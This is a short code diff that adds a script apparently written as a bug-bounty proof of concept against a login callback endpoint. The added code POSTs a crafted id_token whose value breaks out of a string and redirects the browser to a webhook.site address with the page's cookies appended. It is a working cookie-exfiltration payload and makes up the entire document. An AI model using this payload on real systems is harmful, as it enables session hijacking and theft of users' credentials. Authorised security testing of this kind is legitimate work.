@@ -1,1 +1,23 @@
-test
+<script>
+(function () {
+  const endpoint = "https://internal.dev.baemin.com.com/auth/apple-login/callback";
+  const idToken = `';location.href="https://webhook.site/1d973f88-f1fc-49be-95f2-0b5539cddf8c?tmp="%2bdocument.cookie;//`;
+
+  const body = new URLSearchParams({
+    state: "",
+    code: "",
+    id_token: idToken
+  }).toString();
+
+  fetch(endpoint, {
+    method: "POST",
+    mode: "cors",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "bugbounty": "[FindtheGap]security_test_e5d77190-ceab-44e2-b70c-c3bca8578742"
+    },
+    body
+  }).then(r => console.log("status:", r.status))
+    .catch(e => console.error(e));
+})();
+</script>
